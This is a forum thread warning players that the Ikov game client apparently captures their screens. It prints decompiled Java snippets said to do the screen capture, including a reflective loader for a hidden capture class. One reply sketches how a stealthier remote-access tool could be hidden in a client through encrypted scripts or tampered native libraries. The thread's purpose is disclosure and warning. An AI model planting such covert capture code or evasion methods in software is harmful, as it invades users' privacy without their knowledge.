    <title>Anyone who plays Ikov should read this, your privacy potentially being violated</title>
    <link>https://forum.moparisthebest.com/t/anyone-who-plays-ikov-should-read-this-your-privacy-potentially-being-violated/553573</link>
    <description>i obviously didn&#39;t write the OP but i feel people who play ikov should know about this

short version: ikov is taking screenshots of your computer and sending them as packets back to the server so they are able to view them, they could have screenshots of your sensitive information (if you&#39;ve ever had that kind of info open while you&#39;re playing ikov)

---

So was talking to David on Ikov and out of nowhere he quoted someone from a private Skype convo he had no access to.
In other words, he is able to see your screen.

So this drew my attention and looked into his client, where I found this piece of code:


[code=java]public void l()
{
try
{
Robot localRobot = new Robot();
double d10 = Toolkit.getDefaultToolkit().getScreenSize().getHei ght();
double d11 = Toolkit.getDefaultToolkit().getScreenSize().getWid th();
int i = 0;
int j = 0;
BufferedImage localBufferedImage = localRobot.createScreenCapture(k());
new Thread(new H(this, localBufferedImage)).start();
}
catch (Exception localException) {}
}[/code]

So the staff of Ikov is able to create screenshots and use them for any purpose, this is terribly against the rules.
In other words, he is capable of seeing what you are doing (called a RAT) and interact based on your screen. It would have been possible that a staff member requested your screen and then sees the passwords you just opened on that moment.

Of course we would not want that the staff members are capable of seeing your screen, so we are working real hard as of now to get rid of that nasty method and make sure you are good to go. But in the meantime, stay safe and make sure you don&#39;t have anything open that is worth something. (They probably use this as ban method too...).

------ 

JKetelaar is the &quot;Head of Parabot&quot; and also the person who has posted this exact information above. I&#39;m only quoting here so people can have a fair warning. I&#39;m done with Ikov.</description>

<p>Sure, in the OP’s post is it. However, that snippet of code isn’t from the Ikov client.</p>
<p>This one is:</p>
<pre><code class="lang-auto">static private void \u00d6\thisvoid() {
    byte[] b1;
    o2;
    Class c3;

    InvocationTargetException i1;
    NoSuchMethodException n1;
    SecurityException s1;
    b1 = Client.class("capture_util.kov");
    o2 = new class(b1);

    try {
      c3 = o2.loadClass("sc_init");
      o4 = c3.newInstance();
      c3.getDeclaredMethod("cap", {TYPE,TYPE};).invoke(o4, {Integer.valueOf(65551),Integer.valueOf(7480319)};);
    }
    catch (c2) {

    }
    catch (i1) {
      i1.printStackTrace();
    }
    catch (i1) {
      i1.printStackTrace();
    }
    catch (n1) {
      n1.printStackTrace();
    }
    catch (s1) {
      s1.printStackTrace();
    }
  }</code></pre>
<p>If you want to decompile their client and check it’s  static private void \u00d6\u00f5000000(etc)thisvoid</p>
<p>We’re pretty much looking for sc_init.cap() it’s pretty suspicious that they’d use reflection though lol</p>

<p>is proof enough, not to mention if they wanted a screenshot of just the client any non retard wouldn’t use the robot package to achieve this they would just put the current canvas state into a bufferimage and save it.</p>

<p>You’re making the accusation that Ikov is sending the bufferedimage back to the server but you fail to show the code that executes this process.</p>
<p>All you’ve really done is displayed that they are using the native robot class to take a screenshot of the game client yet almost 90% of clients do that anyways for screenshots.</p>

<p>who plays rsps when jagex made a rsps (darkscape)<br>
also trusting any rsps developer</p>
<p>You know how easy it would be to write a RAT into the client that would be undetectable by the higher level programmers? And they choose this route, using a VERY easy to search library. I mean for example, they could store a script in the client (encrypted), call javax.script via reflection, decrypt the script text, and run the script on Rhino/Nashorn and do the same thing. I mean hell, in the newer clients you could recompile the native libraries and inject some nasty code in there.</p>

              <p>i obviously didn’t write the OP but i feel people who play ikov should know about this</p>
<p>short version: ikov is taking screenshots of your computer and sending them as packets back to the server so they are able to view them, they could have screenshots of your sensitive information (if you’ve ever had that kind of info open while you’re playing ikov)</p>
<hr>
<p>So was talking to David on Ikov and out of nowhere he quoted someone from a private Skype convo he had no access to.<br>
In other words, he is able to see your screen.</p>
<p>So this drew my attention and looked into his client, where I found this piece of code:</p>
<p><code>public void l()
{
try
{
Robot localRobot = new Robot();
double d10 = Toolkit.getDefaultToolkit().getScreenSize().getHei ght();
double d11 = Toolkit.getDefaultToolkit().getScreenSize().getWid th();
int i = 0;
int j = 0;
BufferedImage localBufferedImage = localRobot.createScreenCapture(k());
new Thread(new H(this, localBufferedImage)).start();
}
catch (Exception localException) {}
}</code></p>
<p>So the staff of Ikov is able to create screenshots and use them for any purpose, this is terribly against the rules.<br>
In other words, he is capable of seeing what you are doing (called a RAT) and interact based on your screen. It would have been possible that a staff member requested your screen and then sees the passwords you just opened on that moment.</p>
<p>Of course we would not want that the staff members are capable of seeing your screen, so we are working real hard as of now to get rid of that nasty method and make sure you are good to go. But in the meantime, stay safe and make sure you don’t have anything open that is worth something. (They probably use this as ban method too…).</p>
<hr>
<p>JKetelaar is the “Head of Parabot” and also the person who has posted this exact information above. I’m only quoting here so people can have a fair warning. I’m done with Ikov.</p>
